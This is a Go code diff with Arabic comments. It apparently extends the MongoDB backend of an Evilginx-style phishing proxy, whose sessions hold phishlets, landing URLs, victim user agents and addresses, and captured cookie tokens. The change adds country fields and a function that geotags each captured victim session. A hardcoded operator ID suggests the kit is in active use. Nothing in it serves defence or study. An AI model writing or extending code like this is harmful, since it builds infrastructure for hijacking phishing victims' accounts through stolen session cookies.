@@ -41,6 +41,8 @@ type MongoSession struct {
 	CreateTime   int64                         `bson:"create_time" json:"create_time"`
 	UpdateTime   int64                         `bson:"update_time" json:"update_time"`
 	UserId       string                        `bson:"user_id" json:"user_id"`
+	CountryCode  string                        `bson:"country_code" json:"country_code"`
+	Country      string                        `bson:"country" json:"country"`
 }
 
 // NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
@@ -147,6 +149,8 @@ func convertToMongoSession(s *Session) *MongoSession {
 		CreateTime:   s.CreateTime,
 		UpdateTime:   s.UpdateTime,
 		UserId:       s.UserId,
+		CountryCode:  s.CountryCode,
+		Country:      s.Country,
 	}
 }
 
@@ -184,6 +188,8 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		CreateTime:   ms.CreateTime,
 		UpdateTime:   ms.UpdateTime,
 		UserId:       ms.UserId,
+		CountryCode:  ms.CountryCode,
+		Country:      ms.Country,
 	}
 }
 
@@ -268,6 +274,8 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 		CreateTime:   now,
 		UpdateTime:   now,
 		UserId:       "JEMEX123", // تعيين قيمة UserId الثابتة
+		CountryCode:  "",
+		Country:      "",
 	}
 
 	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
@@ -678,4 +686,21 @@ func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
 // SetSessionCookieTokens يحدث رموز الكوكيز للجلسة
 func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	return m.UpdateSessionCookieTokens(sid, tokens)
+}
+
+// UpdateSessionCountryInfo يحدث معلومات البلد للجلسة
+func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country string) error {
+	now := time.Now().UTC().Unix()
+	_, err := m.sessionsColl.UpdateOne(
+		m.ctx,
+		bson.M{"session_id": sid},
+		bson.M{
+			"$set": bson.M{
+				"country_code": countryCode,
+				"country":      country,
+				"update_time":  now,
+			},
+		},
+	)
+	return err
 } 
